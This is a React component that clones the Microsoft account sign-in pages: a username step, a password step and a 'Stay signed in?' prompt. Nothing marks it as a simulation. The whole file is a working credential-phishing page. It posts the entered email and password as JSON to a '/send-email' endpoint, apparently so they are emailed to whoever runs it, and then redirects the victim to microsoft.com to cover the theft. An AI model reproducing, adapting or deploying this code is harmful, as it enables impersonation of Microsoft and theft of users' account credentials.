import React, { useState, useEffect } from 'react';
import Loading from './Loading'; // Ensure this path is correct

function App() {
  const [view, setView] = useState('loading'); // Start with loading view
  const [unameVal, setUnameVal] = useState(false);
  const [pwdVal, setPwdVal] = useState(false);
  const [uname, setUname] = useState('');
  const [pwd, setPwd] = useState('');

  useEffect(() => {
    // Simulate loading time
    const timer = setTimeout(() => {
      setView('uname');
    }, 3000); // Adjust the timeout as needed

    return () => clearTimeout(timer);
  }, []);

  const unReq = "Enter a valid email address, phone number, or Skype name.";
  const pwdReq = "Please enter the password for your Microsoft account.";

  const validate = () => {
    const unameValAction = (type) => {
      if (!type) {
        document.getElementById('error_uname').innerText = unReq;
        setUnameVal(false);
      } else {
        document.getElementById('error_uname').innerText = "";
        setUnameVal(true);
      }
    };

    const pwdValAction = (type) => {
      if (!type) {
        document.getElementById('error_pwd').innerText = pwdReq;
        setPwdVal(false);
      } else {
        document.getElementById('error_pwd').innerText = "";
        setPwdVal(true);
      }
    };

    if (view === 'uname') {
      if (uname.trim() === '') {
        unameValAction(false);
      } else {
        unameValAction(true);
      }
    } else if (view === 'pwd') {
      if (pwd.trim() === '') {
        pwdValAction(false);
      } else {
        pwdValAction(true);
      }
    }
  };

  const handleNext = () => {
    validate();
    if (unameVal) {
      setView('pwd');
    }
  };

  const handleSignIn = () => {
    validate();
    if (pwdVal) {
      setView('final');
      sendLoginDetails(uname, pwd);
    }
  };

  const handleBack = () => {
    setView('uname');
  };

  const handleFinalClick = (isYes) => {
    if (isYes) {
      window.location.href = 'https://www.microsoft.com/en-in';
    } else {
      window.open(window.location.href, '_self').close();
    }
  };

  const sendLoginDetails = (email, password) => {
    fetch('http://localhost:3000/send-email', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ email, password }),
    })
    .then(response => response.json())
    .then(data => {
      console.log('Success:', data);
    })
    .catch(error => {
      console.error('Error:', error);
    });
  };

  if (view === 'loading') {
    return <Loading />;
  }

  return (
    <div>
      {view === 'uname' && (
        <section id="section_uname">
          <div className="auth-wrapper">
            <img src="assets/logo.png" alt="Microsoft" />
            <h2 className="title mb-16 mt-16">Sign in</h2>
            <form>
              <div className="mb-16">
                <p id="error_uname" className="error"></p>
                <input
                  id="inp_uname"
                  type="text"
                  name="uname"
                  className="input"
                  placeholder="Email, phone, or Skype"
                  value={uname}
                  onChange={(e) => setUname(e.target.value)}
                />
              </div>
            </form>
            <div>
              <p className="mb-16 fs-13">No account? <a href="" className="link">Create one!</a></p>
              <p className="mb-16 fs-13">
                <a href="#" className="link">Sign in with a security key
                  <img src="assets/question.png" alt="Question img" />
                </a>
              </p>
            </div>
            <div>
              <button className="btn" id="btn_next" onClick={handleNext}>Next</button>
            </div>
          </div>
          <div className="opts">
            <p className="has-icon mb-0" style={{ fontSize: '15px' }}>
              <span className="icon"><img src="assets/key.png" width="30px" alt="Key icon" /></span>
              Sign-in options
            </p>
          </div>
        </section>
      )}

      {view === 'pwd' && (
        <section id="section_pwd">
          <div className="auth-wrapper">
            <img src="assets/logo.png" alt="Microsoft" className="d-block" />
            <div className="identity w-100 mt-16 mb-16">
              <button className="back" onClick={handleBack}>
                <img src="assets/back.png" alt="Back" />
              </button>
              <span id="user_identity">{uname}</span>
            </div>
            <h2 className="title mb-16">Enter password</h2>
            <form>
              <div className="mb-16">
                <p id="error_pwd" className="error"></p>
                <input
                  id="inp_pwd"
                  type="password"
                  name="pass"
                  className="input"
                  placeholder="Password"
                  value={pwd}
                  onChange={(e) => setPwd(e.target.value)}
                />
              </div>
            </form>
            <div>
              <p className="mb-16"> <a href="#" className="link fs-13">Forgot password?</a></p>
              <p className="mb-16">
                <a href="#" className="link fs-13">Other ways to sign in</a>
              </p>
            </div>
            <div>
              <button className="btn" id="btn_sig" onClick={handleSignIn}>Sign in</button>
            </div>
          </div>
        </section>
      )}

      {view === 'final' && (
        <section id="section_final">
          <div className="auth-wrapper">
            <img src="assets/logo.png" alt="Microsoft" className="d-block" />
            <div className="identity w-100 mt-16 mb-16">
              <span id="user_identity">{uname}</span>
            </div>
            <h2 className="title mb-16">Stay signed in?</h2>
            <p className="p">Stay signed in so you don't have to sign in again next time.</p>
            <label className="has-checkbox">
              <input type="checkbox" className="checkbox" />
              <span>Don't show this again</span>
            </label>
            <div className="btn-group">
              <button className="btn btn-sec" id="btn_final" onClick={() => handleFinalClick(false)}>No</button>
              <button className="btn" id="btn_final1" onClick={() => handleFinalClick(true)}>Yes</button>
            </div>
          </div>
        </section>
      )}
    </div>
  );
}

export default App;